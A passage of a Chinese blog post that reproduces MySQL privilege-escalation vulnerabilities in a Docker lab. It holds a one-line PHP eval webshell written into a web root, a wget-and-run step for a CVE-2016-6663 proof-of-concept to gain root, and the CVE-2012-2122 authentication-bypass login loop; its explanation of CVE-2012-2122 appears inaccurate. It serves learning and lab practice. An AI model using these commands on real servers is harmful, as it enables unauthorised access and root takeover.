<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">slow_query_log</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">slow_query_log_file</span>=/var/log/mysql/slow-query.log<br><span class="hljs-attr">long_query_time</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<p>&emsp;</p>
<h4 id="6-漏洞复现举例"><a href="#6-漏洞复现举例" class="headerlink" title="6.漏洞复现举例"></a>6.漏洞复现举例</h4><ul>
<li><h5 id="mysql用户提权知识"><a href="#mysql用户提权知识" class="headerlink" title="mysql用户提权知识"></a>mysql用户提权知识</h5></li>
</ul>
<p>&emsp;&emsp;前面复刻了几个redis的漏洞问题，现在开始着手mysql的漏洞搭建，mysql的现成搭建漏洞环境比较少，使用的工具有比较多，这里就暂且挑选两个漏洞进行复刻的尝试，首先了解一下mysql的漏洞问题，对于这列中间件，最重要的摸过与提权问题，而MySQL中， UDF 提权、MOF 提权也算是耳熟能详，这些提权的前提条件都是拿到高权限的mysql用户，也就是说mysql的提权来讲，我们首先说起到高权限的mysql用户，之后再进行系统的一个提权操作，这是一般的思路。获取用户账户密码的也无非就是这几种方式：</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">端口弱口令爆破<br>--sql-shell 模式<br>网站的数据库配置文件中拿到明文密码信息<br>CVE<span class="hljs-string">-2012</span><span class="hljs-string">-2122</span> 等这类漏洞直接拿下 MySQL 权限<br></code></pre></td></tr></table></figure>

<ul>
<li><h5 id="高权限用户下的系统提权方法"><a href="#高权限用户下的系统提权方法" class="headerlink" title="高权限用户下的系统提权方法"></a>高权限用户下的系统提权方法</h5></li>
</ul>
<p>&emsp;&emsp;前面提到了UDF 提权、MOF 提权这里进行解释，辅导一些提权过程的截图（查找来的资料）</p>
<p>&emsp;&emsp;在MySQL中，UDF提权是指通过利用用户定义函数的漏洞来获取更高权限的过程。当存在UDF的安全漏洞时，攻击者可以通过构造恶意的UDF来执行任意代码，并以数据库系统的特权身份运行该代码，从而获得比其正常权限更高的访问权限</p>
<center><img src="/img/Linux运维——Mysql（二）/63.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;MOF提权是指通过利用Windows管理对象格式文件的漏洞来获取更高权限的过程。MOF文件是一种用于描述和定义Windows管理对象的文件格式。当存在MOF文件的安全漏洞时，攻击者可以通过构造恶意的MOF文件来执行任意代码，并以系统级别权限运行该代码，从而获得比其正常权限更高的访问权限</p>
<center><img src="/img/Linux运维——Mysql（二）/64.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;启动项提权是指通过修改系统启动项的方式来获取更高权限的过程。启动项是在计算机启动时自动运行的程序或脚本。攻击者可以通过修改启动项，将恶意程序或脚本添加到系统启动流程中，并以系统级别权限运行该恶意代码，从而获得比其正常权限更高的访问权限</p>
<center><img src="/img/Linux运维——Mysql（二）/65.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<ul>
<li><h5 id="安装docker环境"><a href="#安装docker环境" class="headerlink" title="安装docker环境"></a>安装docker环境</h5></li>
</ul>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> docker<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/66.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;安装完成后，启动Docker服务并将其设置为开机自启动。使用以下命令：</p>
<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">sudo <span class="hljs-params">system</span>ctl start docker<br>sudo <span class="hljs-params">system</span>ctl enable docker<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/67.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;安装docker </p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">83</span>:<span class="hljs-number">80</span> -p <span class="hljs-number">3366</span>:<span class="hljs-number">3306</span> -p <span class="hljs-number">9999</span>:<span class="hljs-number">9999</span> --name MySQLprivileges tutum/lamp:latest<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;-d 参数表示以后台模式运行容器。-p 83:80 表示将主机的83端口映射到容器的80端口，这样你可以通过访问主机的83端口来访问容器中运行的Web服务器。-p 3366:3306 表示将主机的3366端口映射到容器的3306端口，这样你可以通过访问主机的3366端口来访问容器中运行的MySQL数据库。-p 9999:9999 表示将主机的9999端口映射到容器的9999端口，这可能是用于反弹连接或其他特定用途。最后，–name MySQLprivileges 指定了容器的名称为MySQLprivileges，而tutum/lamp:latest 是使用的Docker镜像</p>
<center><img src="/img/Linux运维——Mysql（二）/68.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker ps <span class="hljs-comment">#查看container_id</span><br>docker exec -it <span class="hljs-number">6</span>d62681aa477 <span class="hljs-regexp">/bin/</span>bash<br>apt update &amp;&amp; apt install -y wget gcc libmysqlclient-dev<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/69.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;注意这里的6d62681aa477需要使用docker ps指令进行相关查看，6d62681aa477是一个示例容器ID，需要将其替换为要进入的实际容器的ID。一旦进入了容器的bash shell，你可以在其中运行各种命令，就像在本地计算机上一样。可以使用这个shell来查看和修改容器内部的文件、安装软件包、运行脚本等等。当完成操作后，可以使用exit命令退出容器的bash shell，并返回到主机的命令行界面</p>
<p>&emsp;&emsp;apt update &amp;&amp; apt install -y wget gcc libmysqlclient-dev这个命令是在容器的bash shell中使用apt包管理器来更新软件包列表，并安装了wget、gcc和libmysqlclient-dev软件包，这是为后面的mysql环境做准备</p>
<p>&emsp;&emsp;接下来是webshell的写入：</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[r0n1n]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; &gt;  /var/www/html/shell.php</span><br><span class="language-xml">chmod -R 777 var/www/html</span><br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/70.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<ul>
<li><h5 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h5></li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> testdb;<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;test&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;123456&#x27;</span>; <br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">create</span>,<span class="hljs-keyword">drop</span>,<span class="hljs-keyword">insert</span>,<span class="hljs-keyword">select</span> <span class="hljs-keyword">on</span> testdb.* <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;test&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br>flush <span class="hljs-keyword">privileges</span>;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/71.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<ul>
<li><h5 id="CVE-2016-6664模拟入侵"><a href="#CVE-2016-6664模拟入侵" class="headerlink" title="CVE-2016-6664模拟入侵"></a>CVE-2016-6664模拟入侵</h5></li>
</ul>
<p>&emsp;&emsp;目标主机配置必须是是基于文件的日志(默认配置)，也就是不能是syslog方式，tutum/lamp日志方式为syslog，需要修改</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vi</span> etc/mysql/<span class="hljs-keyword">conf</span>.d/mysqld_safe_syslog.<span class="hljs-keyword">cnf</span><br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;别问，问就是这个环境没有vim，vim用习惯了</p>
<center><img src="/img/Linux运维——Mysql（二）/72.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;</p>
<center><img src="/img/Linux运维——Mysql（二）/73.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;重启mysql：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">mysqld_safe <span class="hljs-attribute">--user</span>=mysql<br>grep -r syslog etc/mysql<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/74.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;使用grep指令鉴别对应的mysql，没有返回任何结果即满足所谓的”基于问价日志”要求，接下来就是上传mysql-chowned.sh，代码网上也有，这里就不过多展示了（代码太长了），这里需要注意的是必须以mysql权限执行才能成功提为root，可以利用CVE-2016-6663提升为mysql权限的shell执行如下指令</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/firebroo/</span>CVE-<span class="hljs-number">2016</span>-<span class="hljs-number">6663</span><span class="hljs-regexp">/blob/m</span>aster/poc.sh<br>chmod <span class="hljs-number">777</span> poc.sh<br>.<span class="hljs-regexp">/poc.sh /</span>var<span class="hljs-regexp">/log/my</span>sql/error.log<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;最后就是，获得root的相关权限了，由于这里没有才菜刀，所以都说跳过了6663的漏洞模拟，没想到在这里等着我，可恶啊，最终达到的效果大致是如下：</p>
<center><img src="/img/Linux运维——Mysql（二）/75.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<ul>
<li><h5 id="CVE-2012-2122模拟入侵"><a href="#CVE-2012-2122模拟入侵" class="headerlink" title="CVE-2012-2122模拟入侵"></a>CVE-2012-2122模拟入侵</h5></li>
</ul>
<p>&emsp;&emsp;同样道理，使用docker查看对应的容器, 这里使用了Vulhub 中的 mysql/CVE-2012-2122 模块，在 vulhub/mysql/CVE-2012-2122 目录下使用 docker-compose up -d 命令启动容器：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> vulhub/mysql/CVE-<span class="hljs-number">2012</span>-<span class="hljs-number">2122</span><br><span class="hljs-attribute">docker</span>-compose up -d<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/76.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;执行容器：</p>
<center><img src="/img/Linux运维——Mysql（二）/77.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;这里提示了我们，有其他进程正在使用端口3306，这是由于我之前就按照了5.7版本的mysql没有关闭，因此，需要stop掉，用netstat -tuln | grep 3306或者ps aux | grep mysql进行检验：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">systemctl <span class="hljs-keyword">stop</span> mysql<br><span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> mysql<br>netstat -tuln | <span class="hljs-keyword">grep</span> <span class="hljs-number">3306</span><br>docker-compose <span class="hljs-keyword">up</span> -d<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;检验是否启动常用，测试数据库即可</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mysql</span> -h <span class="hljs-number">192.168.70.180</span> -uroot -p123456<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/78.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;连接正常，说明没有问题，接下来进行5.5版本的漏洞利用</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in `seq <span class="hljs-number">1</span> <span class="hljs-number">1000</span>`; do mysql -uroot -pwrong -h <span class="hljs-number">192.168.70.180</span> -P3306 ; done<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/79.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;尽管我们的密码是错误的，也在多次连接失败后成功进入到数据库中</p>
<p>&emsp;&emsp;CVE-2012-2122是一个影响MySQL数据库的身份认证绕过漏洞，也被称为”MySQL Authentication Bypass”漏洞。该漏洞的利用原理如下：在MySQL中，用户可以选择使用密码进行身份验证，也可以选择使用无密码身份验证。当用户选择无密码身份验证时，MySQL会尝试通过Unix套接字（socket）连接进行身份验证。由于一个错误的实现，MySQL在处理Unix套接字连接时存在漏洞。攻击者可以通过发送特制的请求来利用这个漏洞。攻击者可以通过向MySQL服务器发送恶意请求，使其在进行身份验证时跳过密码验证步骤，从而绕过密码验证并获得对数据库的访问权限。</p>
<p>&emsp;&emsp;具体来说，攻击者可以通过在Unix套接字连接上发送一个空的或包含空字符的用户名，然后在密码字段中输入任意值，从而欺骗MySQL服务器绕过密码验证。</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Linux%E8%BF%90%E7%BB%B4/" class="category-chain-item">Linux运维</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Mysql（二）</div>
      <div>https://one-null-pointer.github.io/2023/06/04/Mysql（二）/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>liaoyue</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>June 4, 2023</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>传送口</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="点击进行传送">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/06/05/Linux%E8%BF%90%E7%BB%B4%E2%80%94%E2%80%94Redis/" title="Redis">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Redis</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/06/03/Linux%E8%BF%90%E7%BB%B4%E2%80%94%E2%80%94Mysql/" title="Mysql（一）">
                        <span class="hidden-mobile">Mysql（一）</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://github.com/" target="_blank" rel="nofollow noopener"><span>pointer</span></a> <i class="iconfont icon-love"></i> <a href="https://mp.weixin.qq.com/s/6ncLUtaiJ9j_sMjZT5z-2w" target="_blank" rel="nofollow noopener"><span>一个爱学习的空指针</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
